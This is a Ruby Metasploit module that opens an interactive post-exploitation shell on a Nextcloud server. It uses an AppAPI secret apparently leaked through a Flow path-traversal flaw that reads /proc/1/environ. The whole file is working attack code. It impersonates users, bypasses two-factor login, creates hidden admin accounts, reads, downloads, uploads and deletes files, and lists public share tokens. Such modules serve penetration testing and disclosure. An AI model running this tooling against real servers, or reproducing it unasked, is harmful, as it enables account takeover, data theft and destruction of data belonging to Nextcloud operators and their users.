
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Nextcloud::AppApi
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nextcloud AppAPI Interactive Shell',
        'Description' => %q{
          Interactive shell for full Nextcloud takeover via AppAPI secret.

          When a Nextcloud ExApp (Flow, Assistant, etc.) is compromised, the APP_SECRET
          from /proc/1/environ grants FULL administrative access to Nextcloud.

          Attack chain:
          1. Leak APP_SECRET via CVE-2026-29059 (Flow path traversal)
          2. Use this shell with the leaked secret for full Nextcloud control

          Features: user impersonation, 2FA bypass, file access, admin creation.
          Type 'help' in the shell for all commands.
        },
        'Author' => ['Valentin Lobstein'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-29059'],
          ['URL', 'https://github.com/Chocapikk/Windfall'],
          ['URL', 'https://github.com/nextcloud/app_api/pull/373']
        ],
        'DisclosureDate' => '2026-01-17',
        'Notes' => { 'Stability' => [CRASH_SAFE], 'SideEffects' => [IOC_IN_LOGS], 'Reliability' => [] },
        'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true, 'HttpTrace' => true }
      )
    )
  end

  def run
    print_status("Connecting to #{rhost}:#{rport}...")

    @cwd = '/'
    @user = nil

    fail_with(Failure::NoAccess, 'Invalid APP_SECRET or connection failed') unless nc_appapi_fetch_users

    users = nc_appapi_list_users
    print_good("Connected! #{users.size} users, admin: #{nc_admin_user || 'none'}")
    @user = nc_admin_user || users.first

    print_banner
    shell_loop
  end

  private

  COMMANDS = {
    'help' => 'Show help', 'exit' => 'Exit shell',
    'users' => 'List users', 'admins' => 'List admins', 'su' => 'Switch user', 'whoami' => 'Current user',
    'adduser' => 'Create user', 'addadmin' => 'Create admin',
    'ls' => 'List files', 'cd' => 'Change dir', 'pwd' => 'Current dir', 'cat' => 'Read file',
    'download' => 'Download file', 'upload' => 'Upload file', 'mkdir' => 'Create dir',
    'rm' => 'Delete', 'mv' => 'Move', 'cp' => 'Copy', 'search' => 'Search files',
    'shares' => 'List shares', 'groups' => 'List groups', 'apps' => 'List apps', 'version' => 'Server info'
  }.freeze

  def print_banner
    print_line("\n  Nextcloud AppAPI Shell - Type 'help' for commands\n")
    print_line("  APP_ID: #{datastore['APP_ID']} | User: #{@user}#{nc_admin_user ? ' (admin)' : ''}\n\n")
  end

  def shell_loop
    setup_readline

    loop do
      line = begin
        Readline.readline("nc(#{@user})> ", true)
      rescue StandardError
        nil
      end
      break unless line

      line.strip!
      next if line.empty?

      args = begin
        Shellwords.shellsplit(line)
      rescue StandardError
        line.split
      end
      cmd = args.shift&.downcase
      break if %w[exit quit].include?(cmd)

      dispatch(cmd, args)
    rescue ::Interrupt
      print_line
    rescue StandardError => e
      print_error("Error: #{e.message}")
    end

    print_status('Shell closed.')
  end

  def dispatch(cmd, args)
    case cmd
    when 'help', '?' then cmd_help
    when 'users' then cmd_users
    when 'admins' then cmd_admins
    when 'su' then cmd_su(args)
    when 'whoami' then cmd_whoami
    when 'adduser' then cmd_adduser(args)
    when 'addadmin' then cmd_addadmin(args)
    when 'ls', 'dir' then cmd_ls(args)
    when 'cd' then cmd_cd(args)
    when 'pwd' then cmd_pwd
    when 'cat' then cmd_cat(args)
    when 'download', 'get' then cmd_download(args)
    when 'upload', 'put' then cmd_upload(args)
    when 'mkdir' then cmd_mkdir(args)
    when 'rm', 'del' then cmd_rm(args)
    when 'mv', 'move' then cmd_mv(args)
    when 'cp', 'copy' then cmd_cp(args)
    when 'search' then cmd_search(args)
    when 'shares' then cmd_shares
    when 'groups' then cmd_groups
    when 'apps' then cmd_apps
    when 'version', 'info' then cmd_version
    else print_error("Unknown: #{cmd}")
    end
  end

  # ==================== COMMANDS ====================

  def cmd_help
    tbl = Rex::Text::Table.new('Header' => 'Commands', 'Columns' => %w[Command Description], 'Indent' => 2)
    COMMANDS.each { |c, d| tbl << [c, d] }
    print_line(tbl.to_s)
  end

  def cmd_users
    users = nc_appapi_list_users
    tbl = Rex::Text::Table.new('Header' => 'Users', 'Columns' => %w[Username Role], 'Indent' => 2)
    users.sort.each { |u| tbl << [u, nc_appapi_user_admin?(u) ? 'admin' : 'user'] }
    print_line(tbl.to_s)
  end

  def cmd_admins
    admins = nc_appapi_list_users.select { |u| nc_appapi_user_admin?(u) }
    admins.empty? ? print_warning('No admins') : print_good("Admins: #{admins.join(', ')}")
  end

  def cmd_su(args)
    return print_error('Usage: su <user>') if args.empty?

    user = args[0]
    return print_error('User not found') unless nc_appapi_list_users.include?(user)

    @user = user
    print_good("Now: #{@user}#{nc_appapi_user_admin?(@user) ? ' (admin)' : ''}")
  end

  def cmd_whoami
    print_good("#{@user}#{nc_appapi_user_admin?(@user) ? ' (admin)' : ''}")
  end

  def cmd_adduser(args)
    return print_error('Usage: adduser <user> <pass>') if args.size < 2

    result = nc_appapi_create_user(args[0], args[1])
    result[:success] ? print_good("Created: #{args[0]}") : print_error(result[:message])
  end

  def cmd_addadmin(args)
    user = args[0] || "adm_#{Rex::Text.rand_text_alpha(5).downcase}"
    pass = args[1] || "#{Rex::Text.rand_text_alphanumeric(16)}!@Ab1"

    result = nc_appapi_create_admin(user, pass)
    if result[:success]
      print_good("Admin: #{user} / #{pass}")
      print_status("Login: #{ssl ? 'https' : 'http'}://#{rhost}:#{rport}/login")
    else
      print_error(result[:message])
    end
  end

  # ==================== FILES ====================

  def cmd_pwd
    print_line("#{@user}:#{@cwd}")
  end

  def cmd_ls(args)
    path = args[0] || @cwd
    files = nc_appapi_list_files(@user, path)
    return print_warning('No files or access denied') unless files&.any?

    tbl = Rex::Text::Table.new('Header' => path, 'Columns' => %w[Type Size Name], 'Indent' => 2)
    files.sort_by { |f| [f[:type] == :directory ? 0 : 1, f[:name].to_s.downcase] }.each do |f|
      tbl << [f[:type] == :directory ? 'DIR' : 'FILE', f[:size].positive? ? "#{f[:size]}B" : '-', f[:name]]
    end
    print_line(tbl.to_s)
  end

  def cmd_cd(args)
    return @cwd = '/' if args.empty?

    path = resolve_path(args[0])
    return print_error("Cannot access: #{path}") unless nc_appapi_list_files(@user, path)

    @cwd = path
  end

  def cmd_cat(args)
    return print_error('Usage: cat <file>') if args.empty?

    content = nc_appapi_download_file(@user, resolve_path(args[0]))
    return print_error('Failed to read') unless content
    return print_warning("Binary (#{content.size}B) - use download") unless content.force_encoding('UTF-8').valid_encoding?

    print_line("\n#{content.size > 8192 ? content[0..8192] + "\n[truncated]" : content}\n")
  end

  def cmd_download(args)
    return print_error('Usage: download <file> [local]') if args.empty?

    remote = resolve_path(args[0])
    content = nc_appapi_download_file(@user, remote)
    return print_error('Download failed') unless content

    local = args[1] || File.basename(remote)
    File.binwrite(local, content)
    print_good("Saved #{content.size}B to #{local}")
  end

  def cmd_upload(args)
    return print_error('Usage: upload <local> [remote]') if args.empty?
    return print_error('File not found') unless File.exist?(args[0])

    content = File.binread(args[0])
    remote = resolve_path(args[1] || File.basename(args[0]))

    nc_appapi_upload_file(@user, remote, content) ? print_good("Uploaded: #{remote}") : print_error('Upload failed')
  end

  def cmd_mkdir(args)
    return print_error('Usage: mkdir <dir>') if args.empty?

    result = nc_appapi_mkdir(@user, resolve_path(args[0]))
    result[:success] ? print_good('Created') : print_error("Failed (#{result[:code]})")
  end

  def cmd_rm(args)
    return print_error('Usage: rm <path>') if args.empty?

    result = nc_appapi_delete(@user, resolve_path(args[0]))
    result[:success] ? print_good('Deleted') : print_error("Failed (#{result[:code]})")
  end

  def cmd_mv(args)
    return print_error('Usage: mv <src> <dst>') if args.size < 2

    result = nc_appapi_move(@user, resolve_path(args[0]), resolve_path(args[1]))
    result[:success] ? print_good('Moved') : print_error("Failed (#{result[:code]})")
  end

  def cmd_cp(args)
    return print_error('Usage: cp <src> <dst>') if args.size < 2

    result = nc_appapi_copy(@user, resolve_path(args[0]), resolve_path(args[1]))
    result[:success] ? print_good('Copied') : print_error("Failed (#{result[:code]})")
  end

  def cmd_search(args)
    return print_error('Usage: search <query>') if args.empty?

    results = nc_appapi_search_files(@user, @cwd, args.join(' '))
    return print_warning('No results') if results.empty?

    print_good("Found #{results.size}:")
    results.each { |f| print_line("  [#{f[:type] == :directory ? 'DIR' : 'FILE'}] #{f[:path]}") }
  end

  # ==================== ENUM ====================

  def cmd_shares
    shares = nc_appapi_list_shares(@user)
    return print_warning('No shares') if shares.empty?

    types = { 0 => 'User', 1 => 'Group', 3 => 'Public', 4 => 'Email', 6 => 'Federated' }
    tbl = Rex::Text::Table.new('Header' => 'Shares', 'Columns' => %w[Type Path Token Pwd], 'Indent' => 2)
    shares.each { |s| tbl << [types[s[:share_type]] || s[:share_type], s[:path], s[:token] || '-', s[:password] ? 'Yes' : '-'] }
    print_line(tbl.to_s)

    public_links = shares.select { |s| s[:share_type] == 3 && s[:token] }
    return if public_links.empty?

    print_good('Public links:')
    public_links.each { |s| print_line("  #{ssl ? 'https' : 'http'}://#{rhost}:#{rport}/s/#{s[:token]}") }
  end

  def cmd_groups
    return print_error('Need admin') unless nc_admin_user

    groups = nc_appapi_list_groups(nc_admin_user)
    return print_warning('No groups') if groups.empty?

    print_good("Groups (#{groups.size}):")
    groups.each do |g|
      members = nc_appapi_group_members(nc_admin_user, g)
      print_line("  #{g} (#{members.size}): #{members.first(3).join(', ')}#{members.size > 3 ? '...' : ''}")
    end
  end

  def cmd_apps
    return print_error('Need admin') unless nc_admin_user

    apps = nc_appapi_list_apps(nc_admin_user)
    enabled_count = apps[:all].count { |a| apps[:enabled].include?(a) }
    print_good("Apps: #{apps[:all].size} listed, #{enabled_count} enabled")
    apps[:all].sort.each { |a| print_line("  #{apps[:enabled].include?(a) ? '[ON]' : '[off]'} #{a}") }
  end

  def cmd_version
    caps = nc_appapi_capabilities(@user)
    return print_error('Failed') unless caps

    print_line("\nServer: #{caps[:name] || 'Nextcloud'} #{caps[:version]} (#{caps[:major]}.#{caps[:minor]})\n")
  end

  # ==================== HELPERS ====================

  def resolve_path(path)
    return @cwd if path.nil? || path.empty?

    full = if path.start_with?('/')
             path
           else
             (path == '..' ? File.dirname(@cwd) : File.join(@cwd, path))
           end
    "/#{full.split('/').reject(&:empty?).join('/')}"
  end

  def setup_readline
    Readline.completion_append_character = ''
    Readline.completion_proc = proc { |input| tab_complete(Readline.line_buffer, input) }
  end

  def tab_complete(line, input)
    words = line.split(/\s+/, -1)
    return COMMANDS.keys.select { |c| c.start_with?(input) }.sort if words.size <= 1

    cmd = words[0].downcase
    partial = words.last

    if cmd == 'su'
      nc_appapi_list_users.select { |u| u.start_with?(partial) }
    elsif %w[ls cd cat download mkdir rm mv cp search].include?(cmd)
      complete_path(partial)
    else
      []
    end
  rescue StandardError
    []
  end

  def complete_path(partial)
    base = if partial.empty?
             @cwd
           else
             (partial.end_with?('/') ? resolve_path(partial) : resolve_path(File.dirname(partial)))
           end
    prefix = partial.empty? ? '' : File.basename(partial).downcase

    files = begin
      nc_appapi_list_files(@user, base)
    rescue StandardError
      []
    end
    return [] unless files

    files.filter_map do |f|
      next unless prefix.empty? || f[:name].downcase.start_with?(prefix)

      name = partial.include?('/') ? "#{File.dirname(partial)}/#{f[:name]}" : f[:name]
      f[:type] == :directory ? "#{name}/" : name
    end.sort
  end
end
